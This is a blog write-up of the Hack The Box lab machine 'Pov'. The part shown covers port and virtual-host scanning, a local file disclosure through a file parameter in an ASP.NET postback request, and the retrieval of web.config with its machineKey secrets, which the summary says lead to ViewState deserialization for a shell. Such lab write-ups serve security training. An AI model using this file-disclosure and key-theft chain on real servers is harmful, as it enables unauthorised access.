<!DOCTYPE html>
<html lang="en">

<head>
  <meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<!-- iOS Safari -->
<meta name="apple-mobile-web-app-capable" content="yes">
<meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
<!-- Chrome, Firefox OS and Opera Status Bar Color -->
<meta name="theme-color" content="#FFFFFF">
<link rel="stylesheet" type="text/css" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.11.1/katex.min.css">
<link rel="stylesheet" type="text/css"
  href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.19.0/themes/prism.min.css">
<link rel="stylesheet" type="text/css" href="css/SourceSansPro.css">
<link rel="stylesheet" type="text/css" href="css/theme.css">
<link rel="stylesheet" type="text/css" href="css/notablog.css">
<!-- Favicon -->

  <link rel="shortcut icon" href="https://www.notion.so/signed/https%3A%2F%2Fprod-files-secure.s3.us-west-2.amazonaws.com%2F2ec3d00f-4cb5-49d6-a169-ee9c29521592%2Fe7dae887-ad1b-438b-8674-40f561aa2ea3%2Fnoun-terminal-4364895.svg?table=collection&amp;id=c08d2689-cc7d-4fc6-bbcc-bf7b8739bc9b">

<style>
  :root {
    font-size: 20px;
  }
</style>
  <title>HTB Machine — Pov&nbsp;|&nbsp;C:\Users\ch3ng &gt;_</title>
  <meta property="og:type" content="blog">
  <meta property="og:title" content="HTB Machine — Pov">
  
    <meta name="description" content="The attack path for Pov is actually pretty straightforward, with no major rabbit holes. However, each step of the attack chain presents different sorts of obstacles, and requires a fair amount of research and debugging to overcome them. It starts with discovering the web server’s machine key through an LFI vulnerability, which can be used to exploit ASP.NET’s insecure ViewState deserialization for a shell. From here, I’ll find PSCredential to move to another user, and exploit SeDebugPrivilege to escalate to SYSTEM.">
    <meta property="og:description" content="The attack path for Pov is actually pretty straightforward, with no major rabbit holes. However, each step of the attack chain presents different sorts of obstacles, and requires a fair amount of research and debugging to overcome them. It starts with discovering the web server’s machine key through an LFI vulnerability, which can be used to exploit ASP.NET’s insecure ViewState deserialization for a shell. From here, I’ll find PSCredential to move to another user, and exploit SeDebugPrivilege to escalate to SYSTEM.">
  
  
    <meta property="og:image" content="https://labs.hackthebox.com/storage/avatars/a36f80aa6bc43863512ec9537c4366c9.png">
  
  <style>
    .DateTagBar {
      margin-top: 1.0rem;
    }
  </style>
</head>

<body>
  <nav class="Navbar">
  <a href="/">
    <div class="Navbar__Btn">
      
        <span><img class="inline-img-icon" src="https://www.notion.so/signed/https%3A%2F%2Fprod-files-secure.s3.us-west-2.amazonaws.com%2F2ec3d00f-4cb5-49d6-a169-ee9c29521592%2Fe7dae887-ad1b-438b-8674-40f561aa2ea3%2Fnoun-terminal-4364895.svg?table=collection&amp;id=c08d2689-cc7d-4fc6-bbcc-bf7b8739bc9b"></span>&nbsp;
      
      <span>Home</span>
    </div>
  </a>
  <span class="Navbar__Delim">&centerdot;</span>
  <a href="https://github.com/ch3ng625", target="_blank">
    <div class="Navbar__Btn">
      <span><img class="inline-img-icon" src="icons/github.svg"></span>&nbsp;
      <span>GitHub</span>
    </div>
  </a>
  <span class="Navbar__Delim">&centerdot;</span>
  <a href="https://au.linkedin.com/in/chengw625/", target="_blank">
    <div class="Navbar__Btn">
      <span><img class="inline-img-icon" src="icons/linkedin.png"></span>&nbsp;
      <span>LinkedIn</span>
    </div>
  </a>
  <span class="Navbar__Delim">&centerdot;</span>
  <a href="https://app.hackthebox.com/profile/786447", target="_blank">
    <div class="Navbar__Btn">
      <span><img class="inline-img-icon" src="icons/htb.svg"></span>&nbsp;
      <span>HackTheBox</span>
    </div>
  </a>
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
    
  
</nav>

  <header class="Header">
    
    <div class="Header__Spacer Header__Spacer--NoCover">
    </div>
    
      <div class="Header__Icon">
        <span><img class="inline-img-icon" src="https://labs.hackthebox.com/storage/avatars/a36f80aa6bc43863512ec9537c4366c9.png"></span>
      </div>
    
    <h1 class="Header__Title">HTB Machine — Pov</h1>
    
      <div class="DateTagBar">
        
          <span class="DateTagBar__Item DateTagBar__Date">Posted on Sun, Jun 9, 2024</span>
        
        
          <span class="DateTagBar__Item DateTagBar__Tag DateTagBar__Tag--blue">
            <a href="tag/HTB">HTB</a>
          </span>
        
          <span class="DateTagBar__Item DateTagBar__Tag DateTagBar__Tag--pink">
            <a href="tag/Windows">Windows</a>
          </span>
        
          <span class="DateTagBar__Item DateTagBar__Tag DateTagBar__Tag--yellow">
            <a href="tag/Medium">Medium</a>
          </span>
        
      </div>
    
  </header>
  <article id="https://www.notion.so/4d2d562b3cba478aa43d76aee393fbc3" class="PageRoot"><h3 id="https://www.notion.so/75693b425c554f4da9b88028d26cba72" class="ColorfulBlock ColorfulBlock--ColorDefault Heading Heading--3"><a class="Anchor" href="#https://www.notion.so/75693b425c554f4da9b88028d26cba72"><svg width="16" height="16" viewBox="0 0 16 16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a><span class="SemanticStringArray"><span class="SemanticString">Summary:</span></span></h3><div id="https://www.notion.so/32228c2fc74f4a31890f982c447fc430" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">The attack path for Pov is actually pretty straightforward, with no major rabbit holes. However, each step of the attack chain presents different sorts of obstacles, and requires a fair amount of research and debugging to overcome them. It starts with discovering the web server’s machine key through an LFI vulnerability, which can be used to exploit ASP.NET’s insecure ViewState deserialization for a shell. From here, I’ll find PSCredential to move to another user, and exploit </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">SeDebugPrivilege</code></span><span class="SemanticString"> to escalate to SYSTEM.</span></span></p></div><div id="https://www.notion.so/3221994fb726444fa584aac1c76806a4" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"></span></p></div><div id="https://www.notion.so/b4b37d02b64d42e78ecf711627a1fcbc" class="Divider"></div><h3 id="https://www.notion.so/9e2eec28c56d4cd9a526045024a1b4e7" class="ColorfulBlock ColorfulBlock--ColorDefault Heading Heading--3"><a class="Anchor" href="#https://www.notion.so/9e2eec28c56d4cd9a526045024a1b4e7"><svg width="16" height="16" viewBox="0 0 16 16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a><span class="SemanticStringArray"><span class="SemanticString">Enumeration:</span></span></h3><div id="https://www.notion.so/3ac751f7205e494789ae711337cd8d50" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><strong class="SemanticString__Fragment SemanticString__Fragment--Bold">Nmap:</strong></span></span></p></div><pre id="https://www.notion.so/2a1c70db7e3a4e15b797562ce16d210c" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor SemanticString__Fragment--ColorOrange"><span>┌──(ch3ng㉿localhost)-[~/machines/pov]
└─$</span></mark></span><span class="SemanticString"><span> sudo nmap --min-rate 1000 -p- 10.129.154.68

Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-02-09 13:25 ACDT
Nmap scan report for 10.129.154.68
Host is up (0.33s latency).
Not shown: 65534 filtered tcp ports (no-response)
PORT   STATE SERVICE
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 133.77 seconds

</span></span><span class="SemanticString"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor SemanticString__Fragment--ColorOrange"><span>┌──(ch3ng㉿localhost)-[~/machines/pov]
└─$</span></mark></span><span class="SemanticString"><span> sudo nmap -A -p 80 10.129.154.68

Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-02-09 13:28 ACDT
Nmap scan report for 10.129.154.68
Host is up (0.33s latency).

PORT   STATE SERVICE VERSION
80/tcp open  http    Microsoft IIS httpd 10.0
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-title: pov.htb
|_http-server-header: Microsoft-IIS/10.0
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running (JUST GUESSING): Microsoft Windows 2019 (89%)
Aggressive OS guesses: Microsoft Windows Server 2019 (89%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

TRACEROUTE (using port 80/tcp)
HOP RTT       ADDRESS
1   333.37 ms 10.10.14.1
2   333.81 ms 10.129.154.68

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 25.79 seconds</span></span></span></code></pre><div id="https://www.notion.so/25eb50f20e3f44a09e061a96a98085ed" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">Only port 80 is open. The scan identified </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">pov.htb</code></span><span class="SemanticString"> as the host name, so I’ll add it to </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">/etc/hosts</code></span><span class="SemanticString">:</span></span></p></div><pre id="https://www.notion.so/3acb2c8b958b497db6877c811dc65dd8" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><span><span class="token comment"># HTB machine Pov    </span>
<span class="token number">10.129</span>.154.68   pov.htb</span></span></span></code></pre><div id="https://www.notion.so/31b97cdf40f64854a4b1b9a04e0f29f4" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"></span></p></div><div id="https://www.notion.so/f2db7e725ced45d099e2e0ba14145183" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><strong class="SemanticString__Fragment SemanticString__Fragment--Bold">TCP80 — HTTP:</strong></span></span></p></div><div id="https://www.notion.so/de471b3f77514fc2957be1eb60bac019" class="Image Image--PageWidth"><figure><a href="https://www.notion.so/signed/https%3A%2F%2Fprod-files-secure.s3.us-west-2.amazonaws.com%2F2ec3d00f-4cb5-49d6-a169-ee9c29521592%2F6db9367b-e68e-4907-ba25-cdcc9879ff62%2FUntitled.png?width=1913&amp;table=block&amp;id=de471b3f-7751-4fc2-957b-e1eb60bac019"><img src="https://www.notion.so/signed/https%3A%2F%2Fprod-files-secure.s3.us-west-2.amazonaws.com%2F2ec3d00f-4cb5-49d6-a169-ee9c29521592%2F6db9367b-e68e-4907-ba25-cdcc9879ff62%2FUntitled.png?width=1913&amp;table=block&amp;id=de471b3f-7751-4fc2-957b-e1eb60bac019" style="width:100%"/></a><figcaption><span class="SemanticStringArray"></span></figcaption></figure></div><div id="https://www.notion.so/23424f5b4b9b491d9dd179d74e7e41ad" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">pov.htb</code></span><span class="SemanticString"> is just a static page, there’s no useful information or links to other pages found. The virtual host scan found </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">dev.pov.htb</code></span><span class="SemanticString">:</span></span></p></div><pre id="https://www.notion.so/255d5cf3c32c41f18fdb245ad26abe06" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor SemanticString__Fragment--ColorOrange"><span>┌──(ch3ng㉿localhost)-[~/machines/pov]
└─$</span></mark></span><span class="SemanticString"><span> gobuster vhost -u http://pov.htb -w bitquark-subdomains-top100000.txt -t 100 --append-domain

===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)
===============================================================
[+] Url:             http://pov.htb
[+] Method:          GET
[+] Threads:         100
[+] Wordlist:        /usr/share/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt
[+] User Agent:      gobuster/3.6
[+] Timeout:         10s
[+] Append Domain:   true
===============================================================
Starting gobuster in VHOST enumeration mode
===============================================================
Found: dev.pov.htb Status: 302 [Size: 152] [--&gt; http://dev.pov.htb/portfolio/]
Found: *.pov.htb Status: 400 [Size: 334]
Progress: 100000 / 100001 (100.00%)
===============================================================
Finished
===============================================================</span></span></span></code></pre><div id="https://www.notion.so/99c5f52ddd7e4771a3ead1bcd4c9bb08" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">I’ll also add this to </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">/etc/hosts</code></span><span class="SemanticString">:</span></span></p></div><pre id="https://www.notion.so/9766c4207faf4382b94fff4412e4ad0e" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><span><span class="token comment"># HTB machine Pov    </span>
<span class="token number">10.129</span>.154.68   pov.htb   dev.pov.htb</span></span></span></code></pre><div id="https://www.notion.so/5a27c8d24e174425b3d5c247c4de3bcc" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">The site seems to be a portfolio of the web developer.</span></span></p></div><div id="https://www.notion.so/249540ccd95f48edb9fdd471b563f33c" class="Image Image--PageWidth"><figure><a href="https://www.notion.so/signed/https%3A%2F%2Fprod-files-secure.s3.us-west-2.amazonaws.com%2F2ec3d00f-4cb5-49d6-a169-ee9c29521592%2F48b3fce3-988f-4a0a-9605-bda446057511%2FUntitled.png?width=1917&amp;table=block&amp;id=249540cc-d95f-48ed-b9fd-d471b563f33c"><img src="https://www.notion.so/signed/https%3A%2F%2Fprod-files-secure.s3.us-west-2.amazonaws.com%2F2ec3d00f-4cb5-49d6-a169-ee9c29521592%2F48b3fce3-988f-4a0a-9605-bda446057511%2FUntitled.png?width=1917&amp;table=block&amp;id=249540cc-d95f-48ed-b9fd-d471b563f33c" style="width:100%"/></a><figcaption><span class="SemanticStringArray"></span></figcaption></figure></div><div id="https://www.notion.so/9a60fee6928b4abdb8e79e3ca421c73b" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">It has a button for downloading his CV.</span></span></p></div><div id="https://www.notion.so/88e27e8498564aa5b8d8df32ea14e838" class="Image Image--PageWidth"><figure><a href="https://www.notion.so/signed/https%3A%2F%2Fprod-files-secure.s3.us-west-2.amazonaws.com%2F2ec3d00f-4cb5-49d6-a169-ee9c29521592%2Fa0cf7e40-1532-489c-a108-d635a05d78f2%2FUntitled.png?width=1254&amp;table=block&amp;id=88e27e84-9856-4aa5-b8d8-df32ea14e838"><img src="https://www.notion.so/signed/https%3A%2F%2Fprod-files-secure.s3.us-west-2.amazonaws.com%2F2ec3d00f-4cb5-49d6-a169-ee9c29521592%2Fa0cf7e40-1532-489c-a108-d635a05d78f2%2FUntitled.png?width=1254&amp;table=block&amp;id=88e27e84-9856-4aa5-b8d8-df32ea14e838" style="width:100%"/></a><figcaption><span class="SemanticStringArray"></span></figcaption></figure></div><div id="https://www.notion.so/2e0889a2e32d4a43936d880fab363355" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">Interestingly, when hovering over the button, it shows a JavaScript function instead of a URL:</span></span></p></div><div id="https://www.notion.so/9536ce217fb34331a5a252e21063c93b" class="Image Image--Normal"><figure><a href="https://www.notion.so/signed/https%3A%2F%2Fprod-files-secure.s3.us-west-2.amazonaws.com%2F2ec3d00f-4cb5-49d6-a169-ee9c29521592%2F007bc106-7cc5-48f5-872f-99a471aa4ccf%2FUntitled.png?width=342&amp;table=block&amp;id=9536ce21-7fb3-4331-a5a2-52e21063c93b"><img src="https://www.notion.so/signed/https%3A%2F%2Fprod-files-secure.s3.us-west-2.amazonaws.com%2F2ec3d00f-4cb5-49d6-a169-ee9c29521592%2F007bc106-7cc5-48f5-872f-99a471aa4ccf%2FUntitled.png?width=342&amp;table=block&amp;id=9536ce21-7fb3-4331-a5a2-52e21063c93b" style="width:342px"/></a><figcaption><span class="SemanticStringArray"></span></figcaption></figure></div><div id="https://www.notion.so/3cd2af1737404f53baaa01226d975611" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">doPostBack</code></span><span class="SemanticString"> is a feature in ASP.NET for enabling server-side processing of custom events. </span><span class="SemanticString"><a class="SemanticString__Fragment SemanticString__Fragment--Link" href="https://evagoras.com/2011/02/10/how-postback-works-in-asp-net/">This post</a></span><span class="SemanticString"> provides a comprehensive guide on how it works. In this case it sends a POST request to </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">/portfolio/</code></span><span class="SemanticString">, which sends back Stephen’s CV in PDF format.</span></span></p></div><div id="https://www.notion.so/7a995f7aada749f98af90057d8001df6" class="Image Image--PageWidth"><figure><a href="https://www.notion.so/signed/https%3A%2F%2Fprod-files-secure.s3.us-west-2.amazonaws.com%2F2ec3d00f-4cb5-49d6-a169-ee9c29521592%2F8b5f8f72-e4db-479f-8489-01fcfb6aa5c5%2FUntitled.png?width=1625&amp;table=block&amp;id=7a995f7a-ada7-49f9-8af9-0057d8001df6"><img src="https://www.notion.so/signed/https%3A%2F%2Fprod-files-secure.s3.us-west-2.amazonaws.com%2F2ec3d00f-4cb5-49d6-a169-ee9c29521592%2F8b5f8f72-e4db-479f-8489-01fcfb6aa5c5%2FUntitled.png?width=1625&amp;table=block&amp;id=7a995f7a-ada7-49f9-8af9-0057d8001df6" style="width:100%"/></a><figcaption><span class="SemanticStringArray"></span></figcaption></figure></div><div id="https://www.notion.so/db31688456ff43dba43fb477264eec39" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">Notice that the filename, </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">cv.pdf</code></span><span class="SemanticString"> is specified in the request. If no further filter/whitelisting is implemented on this parameter, it’s vulnerable to LFI.</span></span></p></div><pre id="https://www.notion.so/ff3e2403aebc4fd4acd8fc4c92ab681a" class="Code"><code><span class="SemanticStringArray"><span class="SemanticString"><span><span class="token assign-left variable">__EVENTTARGET</span><span class="token operator">=</span>download<span class="token operator">&amp;</span><span class="token assign-left variable">__EVENTARGUMENT</span><span class="token operator">=</span><span class="token operator">&amp;</span><span class="token assign-left variable">__VIEWSTATE</span><span class="token operator">=</span>QcByRLrjXn3hFWxM15UQ87i6KT%2FZ1EXSmd2rpqocz0sJTVE7oPhYp9AyMXzreMOxLgUh5CxJMUaoXPpG3plq4jz8frc%3D<span class="token operator">&amp;</span><span class="token assign-left variable">__VIEWSTATEGENERATOR</span><span class="token operator">=</span>8E0F0FA3<span class="token operator">&amp;</span><span class="token assign-left variable">__EVENTVALIDATION</span><span class="token operator">=</span>tWuckc25M6EviYqOiju5dBFkw%2B5B%2BdafRLnVfpM1aYqW1p64gInOBOCdoSZI73%2BL2A8jz22wAxf850i48OrTm74adTx5bj%2Bil2LWb4wxXFHfljzV6OnZwr4ag7oilxAEnPsStQ%3D%3D<span class="token operator">&amp;</span><span class="token assign-left variable">file</span><span class="token operator">=</span>cv.pdf</span></span></span></code></pre><div id="https://www.notion.so/f57982cdda184ef9a14d489583810665" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"></span></p></div><div id="https://www.notion.so/9591d3b583604b56a2556a0b2a0ec3a8" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><strong class="SemanticString__Fragment SemanticString__Fragment--Bold">Local File Disclosure:</strong></span></span></p></div><div id="https://www.notion.so/307f53f1b6d84c999dc08354041e888e" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">I sent the POST request to Repeater and tried grabbing </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">index.aspx</code></span><span class="SemanticString">, but it failed.</span></span></p></div><div id="https://www.notion.so/dae6752972c24ad8944fcaaf83a80f95" class="Image Image--PageWidth"><figure><a href="https://www.notion.so/signed/https%3A%2F%2Fprod-files-secure.s3.us-west-2.amazonaws.com%2F2ec3d00f-4cb5-49d6-a169-ee9c29521592%2Ff48c9670-c16f-41e9-bc88-7f92a14e3bed%2FUntitled.png?width=1625&amp;table=block&amp;id=dae67529-72c2-4ad8-944f-caaf83a80f95"><img src="https://www.notion.so/signed/https%3A%2F%2Fprod-files-secure.s3.us-west-2.amazonaws.com%2F2ec3d00f-4cb5-49d6-a169-ee9c29521592%2Ff48c9670-c16f-41e9-bc88-7f92a14e3bed%2FUntitled.png?width=1625&amp;table=block&amp;id=dae67529-72c2-4ad8-944f-caaf83a80f95" style="width:100%"/></a><figcaption><span class="SemanticStringArray"></span></figcaption></figure></div><div id="https://www.notion.so/552cca046aa0410483c0343b3afd5385" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">The error message mentioned </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">default.aspx</code></span><span class="SemanticString"> however, which I can read, confirming the LFI vulnerability.</span></span></p></div><div id="https://www.notion.so/5553dfe1d87849be8b03af950eba9749" class="Image Image--PageWidth"><figure><a href="https://www.notion.so/signed/https%3A%2F%2Fprod-files-secure.s3.us-west-2.amazonaws.com%2F2ec3d00f-4cb5-49d6-a169-ee9c29521592%2Facbee190-2958-4d71-9df5-ead566f3d4a7%2FUntitled.png?width=1628&amp;table=block&amp;id=5553dfe1-d878-49be-8b03-af950eba9749"><img src="https://www.notion.so/signed/https%3A%2F%2Fprod-files-secure.s3.us-west-2.amazonaws.com%2F2ec3d00f-4cb5-49d6-a169-ee9c29521592%2Facbee190-2958-4d71-9df5-ead566f3d4a7%2FUntitled.png?width=1628&amp;table=block&amp;id=5553dfe1-d878-49be-8b03-af950eba9749" style="width:100%"/></a><figcaption><span class="SemanticStringArray"></span></figcaption></figure></div><div id="https://www.notion.so/6ab623693f994095936b5e4f527a307e" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">The web config file can also be found one directory above:</span></span></p></div><div id="https://www.notion.so/3e11d57121bb43f0ab59d126d7ed705d" class="Image Image--PageWidth"><figure><a href="https://www.notion.so/signed/https%3A%2F%2Fprod-files-secure.s3.us-west-2.amazonaws.com%2F2ec3d00f-4cb5-49d6-a169-ee9c29521592%2F6f9b7a83-86be-478e-b566-e26d6e7ac2b7%2FUntitled.png?width=1630&amp;table=block&amp;id=3e11d571-21bb-43f0-ab59-d126d7ed705d"><img src="https://www.notion.so/signed/https%3A%2F%2Fprod-files-secure.s3.us-west-2.amazonaws.com%2F2ec3d00f-4cb5-49d6-a169-ee9c29521592%2F6f9b7a83-86be-478e-b566-e26d6e7ac2b7%2FUntitled.png?width=1630&amp;table=block&amp;id=3e11d571-21bb-43f0-ab59-d126d7ed705d" style="width:100%"/></a><figcaption><span class="SemanticStringArray"></span></figcaption></figure></div><div id="https://www.notion.so/ba192c8a19054f1ebf9cbadae4eee896" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">It contains a decryption key and a validation key, as well as listing the ASP.NET version to be 4.5.</span></span></p></div><pre id="https://www.notion.so/2995759a352d46468f3e3e6760fd4e82" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>configuration</span><span class="token punctuation">></span></span>
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>system.web</span><span class="token punctuation">></span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>customErrors</span> <span class="token attr-name">mode</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>On<span class="token punctuation">"</span></span> <span class="token attr-name">defaultRedirect</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>default.aspx<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>httpRuntime</span> <span class="token attr-name">targetFramework</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>4.5<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>machineKey</span> <span class="token attr-name">decryption</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>AES<span class="token punctuation">"</span></span> <span class="token attr-name">decryptionKey</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>74477CEBDD09D66A4D4A8C8B5082A4CF9A15BE54A94F6F80D5E822F347183B43<span class="token punctuation">"</span></span> <span class="token attr-name">validation</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>SHA1<span class="token punctuation">"</span></span> <span class="token attr-name">validationKey</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>5620D3D029F914F4CDF25869D24EC2DA517435B200CCF1ACFA1EDE22213BECEB55BA3CF576813C3301FCB07018E605E7B7872EEACE791AAD71A267BC16633468<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span>
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>system.web</span><span class="token punctuation">></span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>system.webServer</span><span class="token punctuation">></span></span>
        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>httpErrors</span><span class="token punctuation">></span></span>
            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>remove</span> <span class="token attr-name">statusCode</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>403<span class="token punctuation">"</span></span> <span class="token attr-name">subStatusCode</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>-1<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span>
            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>error</span> <span class="token attr-name">statusCode</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>403<span class="token punctuation">"</span></span> <span class="token attr-name">prefixLanguageFilePath</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span><span class="token punctuation">"</span></span> <span class="token attr-name">path</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>http://dev.pov.htb:8080/portfolio<span class="token punctuation">"</span></span> <span class="token attr-name">responseMode</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>Redirect<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span>
        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>httpErrors</span><span class="token punctuation">></span></span>
        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>httpRedirect</span> <span class="token attr-name">enabled</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>true<span class="token punctuation">"</span></span> <span class="token attr-name">destination</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>http://dev.pov.htb/portfolio<span class="token punctuation">"</span></span> <span class="token attr-name">exactDestination</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>false<span class="token punctuation">"</span></span> <span class="token attr-name">childOnly</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>true<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>system.webServer</span><span class="token punctuation">></span></span>
